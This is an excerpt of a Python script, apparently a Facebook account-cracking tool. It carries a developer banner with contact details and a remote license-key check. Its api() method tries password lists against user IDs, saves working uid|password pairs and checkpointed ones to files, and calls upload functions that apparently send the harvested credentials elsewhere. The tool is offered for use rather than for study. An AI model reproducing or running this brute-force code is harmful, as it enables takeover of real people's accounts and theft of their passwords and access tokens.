...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/profile.php?id=100018760997097&mibextid=ZbWKwL")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +8801936706784")
	subprocess.check_output(["am", "start", "https://wa.me/+8801936706784"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/Rosid456/p/blob/main/P.txt').text
			if basesplit in plr:
				key = basesplit
		...
		print ("""\_______  _______  _______ _________ ______  
...
|/   \__/(_______)\_______)\_______/(______/
 > \033[0;92mDEVELOPER     : Md ABDUL ROSID 
 > \033[0;95mFACEBOOK ID   : Md ABDUL ROSID
 > \033[0;41mWHATSAPP      : 01936706784
 \033[0;96m> TREM      : CVS
 > \033[0;97mWARNING       : KNO SALAI KHARAP KAJE USE KORBI NA     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [TAHIDUL] : %s/%s -> \033[0;92m [ ROSID -OK:%s ]- \033[0;93m[ROSID -CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [ROSID -OK🥀] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[ROSID -CP🥺] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [ROSID N-CP🥺] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
